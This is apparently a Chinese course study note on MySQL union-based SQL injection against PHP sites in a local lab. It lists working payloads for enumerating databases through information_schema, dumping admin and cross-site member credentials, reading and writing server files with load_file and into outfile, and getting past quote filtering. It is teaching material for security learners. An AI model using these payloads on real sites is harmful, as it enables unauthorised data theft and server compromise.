# PHP应用&MYSQL架构&SQL注入&跨库查询&文件读写&权限操作

MYSQL注入：（目的获取当前web权限）

1、判断常见四个信息（系统，用户，数据库名，版本）

2、根据四个信息去选择方案

root用户：先测试读写，后测试获取数据

非root用户：直接测试获取数据

 

\#PHP-MYSQL-Web组成架构

服务器安装MYSQL数据库，搭建多个站点，数据库集中存储MYSQL数据库中管理

可以都使用root用户管理也可以创建多个用户进行每个网站对应的数据库管理

1、统一交root用户管理

www.zblog.com  = zblog  = root =>MYSQL

www.demo01.com = demo01 = root =>MYSQL

2、一对一用户管理（推荐）

www.zblog.com  = zblog  = zblog =>MYSQL

www.demo01.com = demo01 = demo01 =>MYSQL

 

\#PHP-MYSQL-SQL常规查询

获取相关数据：

1、数据库版本-看是否符合information_schema查询-version()

2、数据库用户-看是否符合ROOT型注入攻击-user()

3、当前操作系统-看是否支持大小写或文件路径选择-@@version_compile_os

4、数据库名字-为后期猜解指定数据库下的表，列做准备-database()

 

MYSQL5.0以上版本：自带的数据库名information_schema

information_schema：存储数据库下的数据库名及表名，列名信息的数据库

information_schema.schemata：记录数据库名信息的表

information_schema.tables：记录表名信息的表

information_schema.columns：记录列名信息表

schema_name：information_schema.schemata记录数据库名信息的列名值

table_schema：information_schema.tables记录数据库名的列名值

table_name：information_schema.tables记录表名的列名值

column_name：information_schema.columns记录列名的列名值

 

order by 6 （代表字段个数）

union select 1,2,3,4,5,6  （测试数据回显位置）

union select 1,2,3,database(),user(),6    （查询当前数据库名   当然用户 ）

union select 1,2,3,version(),@@version_compile_os,6       （查询版本    查询操作系统）



union select 1,2,3,table_name,5,6 from information_schema.tables where table_schema='demo01'        
//在information_schema.tables表table_schema='demo01' 查询table_name



union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='demo01'        （一次性执行全部显示）



union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='admin'                                   (查询列名信息)

union select 1,2,3,username,password,6 from admin limit 0,1

 

\#PHP-MYSQL-SQL跨库查询

影响条件：当前数据库ROOT用户权限

测试不同数据库用户：root demo

union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata

union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema='zblog'

union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_name='zbp_member' and table_schema='zblog'

union select 1,2,3,mem_Name,mem_Password,6 from zblog.zbp_member

 

\#PHP-MYSQL-SQL文件读写

影响条件：

1、当前数据库用户权限

2、secure-file-priv设置

测试不同数据库用户：root demo

union select 1,load_file('d:\\1.txt'),3,4,5,6

union select 1,'xiaodi',3,4,5,6 into outfile 'd:\\2.txt'

读写的路径的问题：

1、报错显示获取路径

2、phpinfo页面泄漏

如果不知道路径思路：

利用常见的默认的中间件，数据库等安装路径读取有价值信息

access无数据库用户

 

mysql里面有内置的管理用户，其中root就是默认数据库管理员用户

网站上面的数据库都在mysql中，由root或一对一用户去管理

 

1、数据库统一管理（root用户）

每个网站的数据库都由root用户统一管理

网站A：192.168.1.4:81  D:/phpstudy_pro/WWW/Z-Blog  数据库root用户  zblog

网站B：192.168.1.4:82  D:/phpstudy_pro/WWW/demo01  数据库root用户  demo01

 

mysql

 root(自带默认)

  网站A  testA

  网站B  testB

 

 

2、数据库一对一管理（不同用户）

自己的网站单独创建数据库用户去管理自己的数据库

网站A：192.168.1.4:81  D:/phpstudy_pro/WWW/Z-Blog  数据库zblog用户  zblog

网站B：192.168.1.4:82  D:/phpstudy_pro/WWW/demo01  数据库demo用户  demo01

 

mysql

 testA用户

  网站A  testA

 testb用户

  网站B  testB

 

 

接受的参数值未进行过滤直接带入SQL查询的操作 就是SQL注入产生的原理

攻击：利用SQL语句执行你想要的东西（SQL语句能干嘛，注入就能干嘛）

SQL语句能干嘛 = SQL语句由谁决定 => 数据库类型决定 (为什么mysql注入 oracle注入叫法原因)

 

http://localhost:63342/demo01/new.php?id=3

select * from news where id=3

 

http://localhost:63342/demo01/new.php?id=3 union select 1,2,username,password,5,6 from admin

select * from news where id=3 union select 1,2,username,password,5,6 from admin

 

access注入 sqlmap  靠字典去猜 又可能猜不到表名 列名

 

mysql

 demo01

  admin

   username,password,id

​    数据

 Zblog

  zbp_member

   mem_Name,mem_Password

​    数据

Access（单个）

 表名

  列名（字段）

   数据

 

目的：获取数据

肯定一步步得到信息

 

查询数据库名demo01下的表名信息（借助information_schema.tables存储查询）

http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='demo01'

 

查询数据库名demo01下的表名admin的列名信息（借助information_schema.columns存储查询）

http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema='demo01' and table_name='admin'

 

跨库查询：       

获取路径 

load_file()的使用 可以在百度上搜索

load_file()常用路径

网站报错

phpinfo 爆出路径



1、数据库统一管理（root用户）

每个网站的数据库都由root用户统一管理

网站A：192.168.1.4:81  D:/phpstudy_pro/WWW/Z-Blog  数据库root用户  zblog

网站B：192.168.1.4:82  D:/phpstudy_pro/WWW/demo01  数据库root用户  demo01

 

 

跨库注入

通过B网站的注入点获取A网站的账号密码

 

获取mysql下所有数据库名：

http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata

 

http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema='zblog'

 

http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema='zblog' and table_name='zbp_member'

 

解决：单引号过滤绕过方式

SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）